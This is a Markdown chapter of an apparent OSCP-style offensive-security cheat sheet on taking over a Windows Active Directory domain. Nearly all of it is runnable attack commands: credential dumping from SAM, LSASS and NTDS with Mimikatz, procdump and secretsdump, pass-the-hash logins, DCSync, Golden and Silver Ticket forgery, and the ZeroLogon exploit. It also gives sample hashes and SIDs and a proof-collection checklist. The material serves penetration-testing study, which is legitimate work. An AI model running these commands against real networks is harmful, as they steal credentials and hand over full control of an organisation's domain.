# 👑 06 — Domain Dominance

---

## Attack Order

```
1. Hash dumping → SAM / LSA / LSASS / NTDS.dit
2. DCSync → dump all domain hashes remotely (requires DA or DCSync rights)
3. Golden Ticket → forge TGT using krbtgt hash → access any service as any user
4. Silver Ticket → forge TGS using service account hash → specific service access
5. ZeroLogon (CVE-2020-1472) → if patching is behind
6. Collect proof.txt + Administrator hash for report
```

---

## Environment Setup

```bash
export ip=172.16.1.5          # DC IP
export domain=OSCP.EXAM
export user=administrator
export pass='P@ssw0rd'
export nthash=5b38382017f8c0ac215895d5f9aacac4
```

---

## Hash Dumping

### SAM Hashes (Local Accounts)

```bash
# NOTE: SAM and SYSTEM files are in C:\Windows\System32\Config
# Cannot copy while system is running — use reg.exe or VSS

# Method 1 — reg.exe export
C:\> reg save hklm\sam C:\temp\SAM
C:\> reg save hklm\system C:\temp\SYSTEM
# Transfer files → Kali → extract
sudo impacket-secretsdump -sam SAM -system SYSTEM LOCAL
sudo samdump2 SYSTEM SAM

# Method 2 — find backup copies
C:\Windows\Tasks> cd C:\ & dir /S /B SAM == SYSTEM == SAM.OLD == SYSTEM.OLD

# Method 3 — VSS shadow copy
C:\Windows\Tasks> wmic shadowcopy call create Volume='C:\'
C:\Windows\Tasks> vssadmin.exe list shadows
C:\Windows\Tasks> mkdir C:\temp
C:\Windows\Tasks> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM C:\temp\SYSTEM
C:\Windows\Tasks> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM C:\temp\SAM

# Method 4 — nishang Copy-VSS.ps1
PS C:\Windows\Tasks> .\Copy-VSS.ps1
PS C:\Windows\Tasks> cd c:\temp && dir
```

### LSA / Domain Hashes (via Mimikatz)

```bash
# Mimikatz — dump LSA
C:\Windows\Tasks> .\mimikatz.exe
mimikatz# privilege::debug
mimikatz# lsadump::lsa /patch
mimikatz# token::elevate

# Invoke-Mimikatz.ps1
PS C:\Windows\Tasks> . .\Invoke-Mimikatz.ps1
PS C:\Windows\Tasks> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::lsa /patch" "exit"'

# Next steps after dump:
# 1. Copy NTLM hashes + usernames
# 2. Crack NTLM or Pass-the-Hash
# 3. Login via impacket-psexec or evil-winrm
sudo impacket-psexec $domain/administrator:'p@ssw0rd'@$ip
sudo impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:5b38382017f8c0ac215895d5f9aacac4 \
  $domain/administrator@$ip
sudo evil-winrm -u administrator -p 'P@ssw0rd' -i $ip
```

### LSASS Process Dump

```bash
# Method 1 — Task Manager (GUI)
Task Manager → Details → lsass.exe → Right Click → Create dump file
# File saved to: C:\Users\%USERNAME%\AppData\Local\Temp\lsass.DMP
# Extract on Kali:
sudo pypykatz lsa minidump lsass.DMP

# Method 2 — procdump64.exe (no GUI required)
# Source: https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
C:\Windows\Tasks> procdump64.exe -ma lsass.exe lsass.dmp -accepteula
sudo pypykatz lsa minidump lsass-1.dmp

# Method 3 — Out-Minidump.ps1 (PowerShell)
PS C:\Windows\Tasks> . .\Out-Minidump.ps1
PS C:\Windows\Tasks> Get-Process lsass | Out-Minidump
sudo pypykatz lsa minidump lsass-1.dmp

# Method 4 — Mimikatz
mimikatz# token::elevate
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Pass-the-Hash after dump
sudo crackmapexec smb $ip -u nessex -H 0d53464368d5e2b607cd68ea29a8cc5f
sudo crackmapexec winrm $ip -u nessex -H 0d53464368d5e2b607cd68ea29a8cc5f
sudo impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:0d53464368d5e2b607cd68ea29a8cc5f \
  $domain/nessex@$ip
```

---

## DCSync

Replicates the DC's NTDS database via DRSUAPI protocol.  
Requires: Domain Admin, or account with DCSync rights (GetChanges + GetChangesAll).

```bash
# Dump all hashes
sudo impacket-secretsdump $domain/$user:$pass@$ip | tee loot/secretsdump.txt

# Via PTH
sudo impacket-secretsdump $domain/administrator@$ip \
  -hashes aad3b435b51404eeaad3b435b51404ee:5b38382017f8c0ac215895d5f9aacac4

# NTLM only (faster)
sudo impacket-secretsdump $domain/$user:$pass@$ip -just-dc-ntlm

# Specific account
sudo impacket-secretsdump $domain/$user:$pass@$ip -just-dc-user krbtgt
sudo impacket-secretsdump $domain/$user:$pass@$ip -just-dc-user administrator

# crackmapexec
sudo crackmapexec smb $ip -d $domain \
  -u administrator -H 5b38382017f8c0ac215895d5f9aacac4 --ntds

# Mimikatz DCSync
mimikatz# lsadump::dcsync /domain:$domain /all /csv
mimikatz# lsadump::dcsync /user:krbtgt
```

---

## Golden Ticket Attack

```
KEY DIFFERENCE:
- Golden Ticket = forged TGT using krbtgt hash → access ANY Kerberos service as ANY user
- Silver Ticket = forged TGS using service account hash → access ONE specific service

Golden Ticket requires 5 pieces of information:
  1. Username: administrator
  2. Domain: OSCP.EXAM
  3. Domain SID: S-1-5-21-2365897340-51848609-3160590671
  4. krbtgt NTLM hash: e6b43234ea2ce6d8bafa4b17c7b3790f
  5. RID: 500
```

### Mimikatz Method (on Windows — with GUI)

```bash
C:\Windows\Tasks> .\mimikatz.exe
mimikatz# privilege::debug
# "Privilege '20' OK" = correct permissions to forge ticket

# Get krbtgt hash + SID
mimikatz# lsadump::lsa /inject /name:krbtgt

# Forge and inject Golden Ticket
mimikatz# Kerberos::golden \
  /user:Administrator \
  /domain:OSCP.EXAM \
  /sid:S-1-5-21-2365897340-51848609-3160590671 \
  /krbtgt:e6b43234ea2ce6d8bafa4b17c7b3790f \
  /id:500 /ptt

# Open CMD shell with ticket
mimikatz# misc::cmd

# Access DC
C:\> dir \\DC01\c$
C:\> .\PsExec64.exe -accepteula \\DC01 -s cmd
```

### impacket-ticketer Method (from Kali — no GUI)

```bash
# Step 1: Get krbtgt hash
sudo impacket-secretsdump $domain/administrator:'password'@$ip | grep krbtgt

# Step 2: Get Domain SID
sudo impacket-lookupsid $domain/administrator:'password'@$ip | grep -i "domain sid"

# Step 3: Forge Golden Ticket
sudo impacket-ticketer \
  -nthash e6b43234ea2ce6d8bafa4b17c7b3790f \
  -domain-sid S-1-5-21-2365897340-51848609-3160590671 \
  -domain OSCP.EXAM \
  administrator

# Step 4: Use ticket
export KRB5CCNAME=/opt/juggernaut/administrator.ccache
sudo impacket-psexec $domain/administrator@DC01.$domain \
  -target-ip 172.16.1.100 -dc-ip 172.16.1.5 -k -no-pass
```

---

## Silver Ticket Attack

Forges TGS for a specific service using the service account hash.  
More stealthy — no DC contact during use.

### Get Service Account NTLM Hash (if not plaintext)

```bash
# Convert plaintext password → NTLM hash
python3 -c "import hashlib,binascii; \
  h=hashlib.new('md4','P@ssw0rd1234!'.encode('utf-16le')).digest(); \
  print(binascii.hexlify(h).decode())"
```

### Get Domain SID

```bash
C:\> cmd.exe /c wmic useraccount get name,sid
```

### Forge Silver Ticket (Mimikatz)

```bash
# Information needed:
# Username: sqlservice
# Domain: OSCP.EXAM
# SID: S-1-5-21-2365897340-51848609-3160590671
# NTLM hash: 5ecb7fb923963202c6567e6fdcf6abdb
# RID: 1111

mimikatz# Kerberos::golden \
  /user:sqlservice \
  /domain:OSCP.EXAM \
  /sid:S-1-5-21-2365897340-51848609-3160590671 \
  /rc4:5ecb7fb923963202c6567e6fdcf6abdb \
  /id:1111 /ptt

# NOTE: Command says "golden" but this IS a Silver Ticket
# The /target and /service flags distinguish it internally
```

---

## ZeroLogon — CVE-2020-1472

```bash
# Source
# https://github.com/dirkjanm/CVE-2020-1472

# Step 1 — Exploit (sets DC machine account password to empty)
python3 cve-2020-1472-exploit.py OSCP.EXAM $ip

# Step 2 — Dump hashes with blank password
sudo impacket-secretsdump -no-pass -just-dc 'OSCP-EXAM$@$ip'

# ⚠️ Restore the machine account password after testing — ZeroLogon will break the DC if not restored
```

---

## Proof Collection

```bash
# Get proof.txt (HTB / OffSec PG format)
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\root.txt

# Screenshot context (include in report)
hostname && whoami && ipconfig && type C:\Users\Administrator\Desktop\proof.txt

# Confirm Domain Admin
net group "Domain Admins" /domain
```

---

## Checklist

```
[ ] SAM / SYSTEM exported and hashes extracted
[ ] LSASS dumped → pypykatz → credentials harvested
[ ] DCSync run → all NTLM hashes saved to loot/
[ ] krbtgt hash obtained and recorded
[ ] Domain SID recorded
[ ] Administrator hash verified with PTH
[ ] Golden Ticket forged and tested (lab) or documented (client)
[ ] proof.txt captured with hostname + whoami screenshot
[ ] ZeroLogon checked if target appears unpatched
```

---

**MITRE ATT&CK:** T1003.001 (LSASS Memory) · T1003.002 (SAM) · T1003.003 (NTDS) · T1558.001 (Golden Ticket) · T1558.002 (Silver Ticket) · T1207 (DCSync)

[← Privilege Escalation](../05-privilege-escalation/README.md) | [Next: Persistence →](../07-persistence/README.md)
